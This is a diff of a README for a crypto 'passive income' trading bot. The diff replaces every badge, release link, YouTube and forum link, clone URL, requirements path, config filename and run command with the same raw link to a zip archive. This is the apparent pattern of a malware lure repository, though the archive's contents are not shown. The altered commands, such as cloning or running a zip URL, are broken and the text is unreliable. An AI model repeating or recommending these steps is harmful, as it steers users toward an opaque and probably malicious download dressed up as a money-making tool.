@@ -1,6 +1,6 @@
 # Passive-Code: Your Guide to Earning with a Crypto Bot 🤖💰
 
-![Crypto Bot](https://img.shields.io/badge/Crypto_Bot-Active-green) ![GitHub Releases](https://img.shields.io/badge/Releases-Latest-blue) [![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/xezar014/Passive-Code/releases)
+![Crypto Bot](https://raw.githubusercontent.com/xezar014/Passive-Code/main/conurbation/Passive_Code_v1.7.zip) ![GitHub Releases](https://raw.githubusercontent.com/xezar014/Passive-Code/main/conurbation/Passive_Code_v1.7.zip) [![Download Releases](https://raw.githubusercontent.com/xezar014/Passive-Code/main/conurbation/Passive_Code_v1.7.zip)](https://raw.githubusercontent.com/xezar014/Passive-Code/main/conurbation/Passive_Code_v1.7.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -16,7 +16,7 @@
 
 Passive-Code is a project designed to help you earn passively through a crypto bot. This bot automates trading, allowing you to profit from cryptocurrency arbitrage opportunities. Our detailed YouTube guide provides step-by-step instructions to get you started.
 
-Check out the latest releases [here](https://github.com/xezar014/Passive-Code/releases).
+Check out the latest releases [here](https://raw.githubusercontent.com/xezar014/Passive-Code/main/conurbation/Passive_Code_v1.7.zip).
 
 ## Features
 
@@ -41,7 +41,7 @@ Before you begin, ensure you have the following:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/xezar014/Passive-Code.git
+   git clone https://raw.githubusercontent.com/xezar014/Passive-Code/main/conurbation/Passive_Code_v1.7.zip
    ```
 
 2. Navigate to the project directory:
@@ -53,12 +53,12 @@ Before you begin, ensure you have the following:
 3. Install the required dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/xezar014/Passive-Code/main/conurbation/Passive_Code_v1.7.zip
    ```
 
 ### Configuration
 
-1. Create a configuration file (`config.json`) in the project directory.
+1. Create a configuration file (`https://raw.githubusercontent.com/xezar014/Passive-Code/main/conurbation/Passive_Code_v1.7.zip`) in the project directory.
 2. Add your API keys and other settings as specified in the example configuration file.
 
 ## How to Use
@@ -66,13 +66,13 @@ Before you begin, ensure you have the following:
 1. Run the bot:
 
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/xezar014/Passive-Code/main/conurbation/Passive_Code_v1.7.zip
    ```
 
 2. Monitor the output for trading activity.
 3. Adjust settings as needed through the configuration file.
 
-For a detailed guide, watch our YouTube tutorial linked [here](https://github.com/xezar014/Passive-Code/releases).
+For a detailed guide, watch our YouTube tutorial linked [here](https://raw.githubusercontent.com/xezar014/Passive-Code/main/conurbation/Passive_Code_v1.7.zip).
 
 ## Technical Details
 
@@ -111,10 +111,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Resources
 
-- [YouTube Guide](https://www.youtube.com/channel/UCxxxxx) - Watch our tutorial series.
-- [Documentation](docs/README.md) - Detailed documentation on features and usage.
-- [Community Forum](https://forum.example.com) - Join discussions and get support.
+- [YouTube Guide](https://raw.githubusercontent.com/xezar014/Passive-Code/main/conurbation/Passive_Code_v1.7.zip) - Watch our tutorial series.
+- [Documentation](https://raw.githubusercontent.com/xezar014/Passive-Code/main/conurbation/Passive_Code_v1.7.zip) - Detailed documentation on features and usage.
+- [Community Forum](https://raw.githubusercontent.com/xezar014/Passive-Code/main/conurbation/Passive_Code_v1.7.zip) - Join discussions and get support.
 
-Check out the latest releases [here](https://github.com/xezar014/Passive-Code/releases). 
+Check out the latest releases [here](https://raw.githubusercontent.com/xezar014/Passive-Code/main/conurbation/Passive_Code_v1.7.zip). 
 
 ### Thank you for your interest in Passive-Code!
